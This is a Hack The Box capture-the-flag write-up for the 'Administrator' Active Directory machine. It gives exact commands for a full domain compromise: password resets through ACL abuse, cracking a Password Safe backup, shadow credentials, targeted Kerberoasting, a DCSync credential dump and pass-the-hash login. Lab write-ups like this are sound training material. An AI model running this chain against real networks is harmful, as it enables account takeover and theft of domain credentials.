---
title: "CTF Writeup: Administrator"
date: 2024-12-14
categories: [CTF, Writeup, hackthebox]
tags: [AD, Bloodhound, HTB]
---

# Hack The Box - Administrator

## Description
Administrator is a medium difficuly Windows Active Directory machine. The machine is designed around a complete domain compromise scenario, where credentials for a low-privileged user are provided.

## Information Gathering

### Step 1: Enumeration
Starting with running good olde nmap to enumerate the target machine.

```bash
# sudo nmap -sC -sV -A -v -p- -Pn -T4 -oN NMAP/Administrator_TCP 10.129.137.44
```
![alt text](/assets/screenshots/Administrator/image.png) <br>
From the output of the nmap scan it's clear that this is a active directory machine.

First I will check if the credentials supplied are working.

```bash
# netexec smb 10.129.137.44 -u olivia -p 'ichliebedich'
```
![alt text](/assets/screenshots/Administrator/image-1.png)<br>
The credentials seem to work on the target. The user account is legit.

Next step is to check if the user account is allowed to login to the target using winrm. To check this I could use netexec again or simply try with evil-winrm.

```bash
# evil-winrm -i 10.129.137.44 -u olivia -p 'ichliebedich'
```
![alt text](/assets/screenshots/Administrator/image-2.png)<br>
The login was successfull. It's now possible to enumerate the target internally and get some more insight in what kind of attack path I can take.<br>
Looking at the users present on the system is always a good first step.

```bash
# whoami /all
```
![alt text](/assets/screenshots/Administrator/image-4.png)<br>
These usernames can be used later in the process to enumerate and bruteforce if needed.

Next is using bloodhound to enumerate the Active Directory network. Using bloodhound shows a lot of information about relations between users, groups, objects and more about the network. This can be a treasure trove of information about the target network.
```bash
# netexec ldap 10.129.137.44 -u olivia -p 'ichliebedich' --bloodhound --collection All --dns-server 10.129.137.44
```
![alt text](/assets/screenshots/Administrator/image-5.png)

After the data is retrieved I upload the zip file into bloodhound and check for interesting relations.
![alt text](/assets/screenshots/Administrator/image-6.png)<br>
The owned user Olivia has <b>GenericAll</b> rights over Michael. This means that using the Olivia account I can, for example, update the password for the Micheal user. Doing this will give access to the Micheal Account.

## Exploitation

### Step 2: Lateral Movement

Using the evil-winrm session with Olivia I will change the password for the Michael account.
```bash
# net user michael password123 /domain
```
![alt text](/assets/screenshots/Administrator/image-7.png)<br>

Now I can test if the password change was successful using netexec.
```bash
# netexec smb 10.129.134.44 -u micheal -p 'password123'
```
![alt text](/assets/screenshots/Administrator/image-14.png)<br>
The password update worked! <br>
Now I can try to get another session using winrm with the Micheal account.
```bash
# evil-winrm -i 10.129.137.44 -u michael -p 'password123'
```
![alt text](/assets/screenshots/Administrator/image-15.png)<br>
The session works! I'm able to login to the target using the Micheal account.

Now I will update the bloodhound to show that the user Micheal is pwnd. This can give some new attack paths I can take.
![alt text](/assets/screenshots/Administrator/image-10.png) <br>
Checking the First Degree Object Control for the user Michael we see that the account has <b>ForceChangePassword</b> privileges on Benjamin.<br>

This means I can use the net rpc command to update the password for the Benjamin user.
```bash
# net rpc password benjamin password123 -U Administrator.htb/michael%password123 -S administrator.htb
```
![alt text](/assets/screenshots/Administrator/image-11.png)<br>

Now I will verify of the password change worked using netexec.
```bash
# netexec smb 10.129.137.44 -u benjamin -p 'password123'
```
![alt text](/assets/screenshots/Administrator/image-16.png)<br>

The password change worked and the account it now active. However I am not able to use it to setup a session with winrm like the other accounts. This accounts seems to have more restrictions then the others.<br>

However during the enumeration phase a ftp server was found.

![alt text](/assets/screenshots/Administrator/image-17.png)<br>
The Benjamin account has access to the ftp service. Inside this FTP server a backup.psafe3 file was found.

### Cracking the pwsafe backup file

Using the Benjamin account I found a pwsafe backup file on then ftp server on the target. I will try and crack the password on the backup file and get access to the content. <br>

First I need to extract the hash from the backup file before cracking it. For this I will be using john with the pwsafe module.
```bash
# pwsafe2john Backup.psafe3 > pwsafe.hash
# john --wordlist=/usr/share/wordlists/rockyou.txt pwsafe.hash
```
![alt text](/assets/screenshots/Administrator/image-20.png)<br>
It worked! I now have access to the contents of the backup pwsafe file.<br>

![alt text](/assets/screenshots/Administrator/image-19.png)<br>
Inside the backup file there are credentials for 3 users.

Checking these credentials I found that the credentials for emily still work!
![alt text](/assets/screenshots/Administrator/image-22.png)<br>

I update bloodhound so I can see what attack paths I got with the Emily user.
![alt text](/assets/screenshots/Administrator/image-21.png)<br>

Emily got <b>GenericWrite</b> privileges on Ethan.

Now that I know that Emily has GenericWrite over Ethan I can use pywhisker in combination with a targeted kerberoast to extract the hash for ethan from the SPN.

First I use pywhisker to obtain the TGT I need for the targeted kerberoast. <br>

```bash
# python3 pywhisker.py -d administrator.htb -u emily -p password --target ethan --action "add"
```
![alt text](/assets/screenshots/Administrator/image-24.png)<br>

Now I need to update our time to be in sync with the target. I can use ntpdate for this. <br>

```bash
# ntpdate administrator.htb
```
![alt text](/assets/screenshots/Administrator/image-23.png)<br>

Now I should be able to use the targetedkerberoast attack on the target.
```bash
# python3 targetedKerberoast.py -v -d 'administrator.htb' -u emily -p password
```
![alt text](/assets/screenshots/Administrator/image-33.png)<br>

Cracking the hash should result in the password for the user Ethan!

![alt text](/assets/screenshots/Administrator/image-26.png) <br>
The credentials are still active.

Now for testing the credentials I use good olde netexec.
```bash
# netexec smb 10.129.137.44 -u ethan -p 'password'
```
![alt text](/assets/screenshots/Administrator/image-28.png)<br>

Now that I got access to the machine using the user account Ethan. I will update bloodhound to see a new attack path with the user account Ethan.
![alt text](/assets/screenshots/Administrator/image-27.png)<br>
Ethan can use a DCSync attack!

## Privilege Escalation
### Executing DCSync

I will use impacket-secretsdump to execute the DCSync.
```bash
# impacket-secretsdump -just-dc-user administrator administrator.htb/ethan:"password"@administrator.htb
```
![alt text](/assets/screenshots/Administrator/image-29.png)<br>
Seems I got the Administrator hash!

I'll try connecting to the target using the winrm protocol and the administrator accounts with a pass-the-hash attack.
```bash
# evil-winrm -i 10.129.137.44 -u administrator -H HASH
```
![alt text](/assets/screenshots/Administrator/image-32.png)<br>
I got an active session on the target as the Administrator user.

Now I can get the flags.

![alt text](/assets/screenshots/Administrator/image-30.png)<br>
Got him!

![alt text](/assets/screenshots/Administrator/image-31.png)<br>
NOICE!

## Conclusion
To summarize this machine. This machine has a lot of DACL misconfigurations, this allows the system to be compromised a lot easier. This made this machine a fine way to practive some basic AD movement and AD pentesting practice.

## Lessons Learned
- Make sure the relations and rights of users and groups are correctly enforced.
- Use only hard to guess passwords